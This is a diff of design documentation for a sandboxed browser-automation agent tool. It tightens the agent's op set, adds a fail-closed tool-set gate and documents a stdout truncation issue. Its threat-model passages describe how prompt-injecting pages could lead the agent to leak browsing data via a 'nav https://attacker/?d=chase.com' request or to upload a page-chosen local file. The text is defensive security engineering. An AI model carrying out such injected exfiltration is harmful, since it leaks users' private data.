@@ -494,9 +494,39 @@ The agent's entire capability is a single **custom opencode tool**, `browser`
 (`opencode/tools/browser.js` + its pure-logic sibling `browser_tool_impl.mjs`,
 copied into the scratch project's `.opencode/tools/` per run). The model calls it
 with TYPED arguments — `op` ∈ {`text`,`html`,`eval`,`nav`,`screenshot`,`frames`,
-`click`,`type`,`key`,`activate`} plus optional `selector`/`url`/`js`/`text`/`key`/`frame`/
+`click`,`type`,`key`,`activate`,`whoami`} plus optional `selector`/`url`/`js`/`text`/`key`/`frame`/
 `maxBytes`/`waitMs` — **never a shell command string, and never a raw-CDP `cdp`/`method`
 field** (the CDP ops are bounded typed ops only; see the CDP security model above).
+
+- **The agent's `whoami` is NARROWED — no cross-profile reconnaissance.** The
+  server's `whoami_snapshot` iterates every live instance, so a bare passthrough
+  would tell the autonomous model what the operator is browsing in *unrelated*
+  profiles. The tool's summarizer therefore drops `activeTabDomain` outright (for
+  every instance, including the agent's own) and lists only the agent's OWN forced
+  instance (`BROWSER_AGENT_INSTANCE`, matched by key or label; an unmatched value
+  yields an empty list rather than falling back to "all"). The git HEAD inside
+  `server_version` is dropped too — only the version string survives. Why it
+  matters: with no `--allow-domains` set, `hostDenied()` permits any host, so a
+  leaked `{label:"banking", activeTabDomain:"chase.com"}` is one
+  `nav https://attacker/?d=chase.com` away from exfil by a model that is by design
+  reading prompt-injecting pages. This is the same leak that keeps `tabs` out of
+  the agent's op set ("`tabs` would leak other tabs' URLs"); `whoami` had
+  reintroduced a narrower version of it. The op's stated purpose — *which host and
+  which profile am I on* — is fully intact. The `browser whoami` CLI is unchanged;
+  the operator still sees everything.
+- **`upload` is NOT in the agent's op set** (11 ops, above — no `upload`). The
+  `browser` CLI keeps it: an operator choosing a path by hand is a legitimate,
+  audit-logged action. The autonomous model is different — it is by design pointed
+  at untrusted, prompt-injecting pages, and `upload` takes a caller-chosen
+  ABSOLUTE path with no allowlist, so a page could effectively pick the file whose
+  contents get posted to it. It is therefore absent from all four places that
+  define the agent's surface — `browser.js`'s typed `op` enum, `browser_tool_impl.mjs`'s
+  `ALLOWED_OPS_DEFAULT`, the agent-md capability table, and this list — which
+  `tests/browser_tool.test.mjs` parses and asserts identical, so they cannot drift.
+  It stays REACHABLE for a deliberate opt-in via `BROWSER_AGENT_ALLOWED_OPS` (see
+  the env-var table below); nothing depends on opencode's schema validation to
+  enforce this, since whether an out-of-enum `op` is rejected before `execute()` is
+  an unpinned implementation detail of opencode.
 
 - **Why this replaced the bash tool.** The MVP gave the agent opencode's *bash*
   tool, permission-scoped to `browser --tab <id> *`. opencode denies by matching
@@ -514,10 +544,10 @@ field** (the CDP ops are bounded typed ops only; see the CDP security model abov
   browser: allow}`. Verified with `opencode debug agent browser-agent`: the
   resolved tool set is `{bash:false, read:false, edit:false, write:false,
   webfetch:false, …, browser:true}` — only the typed tool is enabled.
-- **Runtime fail-closed tool-set gate (this is what makes an un-upgraded /
-  other opencode version SAFE).** The denial above is a *property of the resolved
-  config*, and different opencode versions resolve it differently (workbench is
-  1.17.20, laptop 1.18.4). So BEFORE opening a tab or spending a single model
+- **Runtime fail-closed tool-set gate (this is what makes an unverified opencode
+  version SAFE).** The denial above is a *property of the resolved config*, not
+  something the wrapper can assume — a future opencode could resolve it
+  differently. So BEFORE opening a tab or spending a single model
   token, the wrapper runs `opencode debug agent browser-agent` (a **read-only,
   model-free config dump**) in the scratch project and parses the resolved `tools`
   map. It **refuses to run** (`die`, non-zero, model never invoked) unless
@@ -529,10 +559,29 @@ field** (the CDP ops are bounded typed ops only; see the CDP security model abov
   landmine into a loud, safe refusal — on any opencode where the host-tool denial
   did not take, `browser agent` refuses rather than running the model with a shell.
   Because the gate runs **before** the tab is opened, a gate failure leaks no tab.
-  *opencode version requirement:* an opencode whose `debug agent` reports a
-  browser-only tool set (verified on 1.18.4; the resolved `tools` map above). If a
-  future/other version can't be confirmed browser-only, upgrade — the gate will
-  refuse until it can.
+
+  *Prerequisite:* an opencode whose `debug agent` reports a browser-only tool set.
+  **Both hosts run 1.18.4 and both resolve browser-only** (verified: the dump
+  parses to exactly one enabled tool, `browser`). There is no version-skew caveat
+  here any more.
+
+  *The failure mode that actually bites — capture the dump to a FILE, never a
+  pipe.* opencode does not reliably flush stdout before exiting when stdout is a
+  pipe, so a `$(opencode debug agent …)` command substitution can return a
+  TRUNCATED prefix. Measured on these hosts: `debug skill` 65536 B via pipe vs
+  293329 B via file (deterministic across 3 runs); `debug v2` 55276 / 55276 /
+  6103 B across three identical pipe runs — two different cut points *and*
+  run-to-run variance, i.e. a flush race on exit, not a fixed buffer cap.
+  Truncated JSON is unparseable, so the gate correctly fails closed — but the
+  refusal reads `unparseable debug-agent tool set: Unterminated string…`, which
+  looks exactly like an unsupported-version problem and misdirects the diagnosis.
+  The wrapper therefore redirects the dump to `$SCRATCH/gate.json` and parses the
+  file; the same command that failed via `$(...)` parses cleanly to `['browser']`
+  from a file. **Reproduce the gate the same way** — `opencode debug agent
+  browser-agent > /tmp/gate.json` — never through a pipe. The wrapper's three
+  refusal messages are deliberately distinct so you can tell them apart: *failed
+  to RUN (non-zero exit)* vs *produced NO output* vs *output was UNPARSEABLE* vs
+  *tool set is not browser-only*.
 - **The model cannot choose the tab / instance / domain policy.** The wrapper
   FORCES them on the tool via env (`BROWSER_AGENT_TAB`/`_INSTANCE`/
   `_ALLOW_DOMAINS`/`_DENY_DOMAINS`/`_DRY_RUN`, + inherited `BROWSER_BRIDGE_*`).
@@ -569,7 +618,7 @@ emits **newline-delimited JSON events** (NOT one document): `{"type":"step_start
 …}`, `{"type":"text","part":{"type":"text","text":"…"}}`, `{"type":"step_finish",
 "part":{…,"tokens":{…},"cost":…}}`. The assistant answer is in the `text` parts;
 `browser-agent-parse.py` concatenates them and extracts the last balanced schema
-object (defensive across the laptop 1.18.4 / workbench 1.17.20 version skew).
+object (defensively, so a future envelope change can't break the parse).
 
 **Cost / latency (est.):** ~$0.005–0.008 and ~10–25 s per task on
 `deepseek-v4-flash` (cold-start opencode can take longer — hence the generous
@@ -602,16 +651,38 @@ ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/tools/browser_tool_impl
 (The global def keeps the `__STEPS__`/`__MODEL__` placeholders — inert on its own;
 the wrapper substitutes them per run.)
 
-**⚠ opencode version skew (workbench 1.17.20 vs laptop 1.18.4).** The custom-tool
-mechanism (`.opencode/tools/*.js`, `permission: {"*": deny, …}`) is **verified on
-1.18.4** (laptop) via `opencode debug agent browser-agent` (resolved tools show
-`bash:false … browser:true`) and an end-to-end `opencode debug agent … --tool
-browser` run against a fake bridge. It is **NOT verified on 1.17.20** (workbench) —
-custom-tool support and the tool-dir name may differ. Mitigations: the wrapper
-writes the tool to BOTH `.opencode/tools/` and `.opencode/tool/`; but if 1.17.20
-does not support project custom tools at all, `browser agent` will not work there.
-**Recommend upgrading workbench to ≥1.18.4** (`opencode upgrade`) before relying on
-`browser agent` on that host, and re-running the `opencode debug agent` check.
+**opencode version.** The custom-tool mechanism (`.opencode/tools/*.js`,
+`permission: {"*": deny, …}`) is **verified on 1.18.4, which is what BOTH hosts
+run** — `opencode debug agent browser-agent` resolves to `bash:false … browser:true`
+(exactly one enabled tool) on each, plus an end-to-end `opencode debug agent …
+--tool browser` run against a fake bridge. The wrapper still writes the tool to
+BOTH `.opencode/tools/` and `.opencode/tool/` as cheap insurance against a future
+tool-dir rename. If you upgrade opencode and it stops resolving browser-only, the
+runtime tool-set gate refuses the run — that is the intended, safe outcome; fix
+the config or roll back rather than weakening the gate.
+
+⚠ **When checking the gate by hand, redirect to a FILE.** `opencode debug agent … |`
+/ `$(opencode debug agent …)` can return truncated output (flush race on exit — see
+the tool-set-gate section above), which reads as an unsupported-version failure and
+sends you down the wrong path. Always `> /tmp/gate.json` first.
+
+**Env vars the agent layer reads** (all are operator/test seams — the MODEL can
+set none of them; it only ever supplies typed tool args):
+
+| var | default | what it does |
+|---|---|---|
+| `BROWSER_AGENT_ALLOWED_OPS` | *(unset → the 11-op `ALLOWED_OPS_DEFAULT`)* | space/comma list that REPLACES the agent's op allowlist wholesale. Narrows it (`"text,html"`) or deliberately re-enables an off-by-default op — this is the ONLY supported way to give the autonomous agent `upload` |
+| `BROWSER_AGENT_OPENCODE` | `opencode` | the opencode binary (test seam) |
+| `BROWSER_AGENT_BROWSER_BIN` | `./browser` | the `browser` CLI used for open/close/probe (test seam) |
+| `BROWSER_AGENT_MODEL` | `openrouter/deepseek/deepseek-v4-flash` | model baked into the per-run agent def |
+| `BROWSER_AGENT_TEMPLATE` | `opencode/browser-agent.md` | the agent-md template to instantiate |
+| `BROWSER_AGENT_TOOL_DIR` | `opencode/tools` | dir holding `browser.js` + `browser_tool_impl.mjs` |
+| `BROWSER_AGENT_KEEP_SCRATCH` | `0` | `1` keeps the per-run scratch dir (transcripts, `gate.json`, `tool-audit.jsonl`) for debugging |
+| `BROWSER_AGENT_READY_ATTEMPTS` | `3` | open→readiness-probe retry budget |
+| `BROWSER_AGENT_READY_BACKOFF` | `0.4` | seconds between readiness retries |
+| `BROWSER_AGENT_TAB` / `_INSTANCE` / `_ALLOW_DOMAINS` / `_DENY_DOMAINS` / `_DRY_RUN` / `_AUDIT` / `_SESSION_ID` | *(set by the wrapper per run)* | the FORCED tab / instance / domain policy / dry-run / audit-log path / session id the tool reads. Not for hand-setting — the wrapper owns them |
+| `BROWSER_BRIDGE_HOST` / `BROWSER_BRIDGE_PORT` | `127.0.0.1` / `8788` | the loopback bridge the tool POSTs to (inherited) |
+| `BROWSER_BRIDGE_TOKEN_FILE` | `~/.config/browser-bridge/token` | bearer-token file the tool reads |
 
 ### Manual live check (the one step that needs real Brave + a real model — CANNOT run in CI)
 
@@ -627,8 +698,11 @@ sed -e 's/__STEPS__/12/g' -e 's#__MODEL__#openrouter/deepseek/deepseek-v4-flash#
   scripts/browser-bridge/opencode/browser-agent.md > "$S/.opencode/agents/browser-agent.md"
 cp scripts/browser-bridge/opencode/tools/browser.js \
    scripts/browser-bridge/opencode/tools/browser_tool_impl.mjs "$S/.opencode/tools/"
-( cd "$S" && opencode debug agent browser-agent ) | python3 -c \
-  'import json,sys; t=json.load(sys.stdin)["tools"]; assert t["bash"] is False and t["browser"] is True; print("OK: bash denied, only browser enabled")'
+# NOTE the FILE redirect — a pipe/`$(...)` can truncate opencode's stdout (flush
+# race on exit) and turn a healthy config into a bogus "unparseable" failure.
+( cd "$S" && opencode debug agent browser-agent ) > "$S/gate.json"
+python3 -c \
+  'import json,sys; t=json.load(open(sys.argv[1]))["tools"]; assert t["bash"] is False and t["browser"] is True; print("OK: bash denied, only browser enabled")' "$S/gate.json"
 # (b) the tool refuses a bad op / disowned tab (executes the tool, no model, no bridge):
 ( cd "$S" && opencode debug agent browser-agent --tool browser --params '{"op":"open"}' ) 2>&1 | grep op_not_allowed
 ```
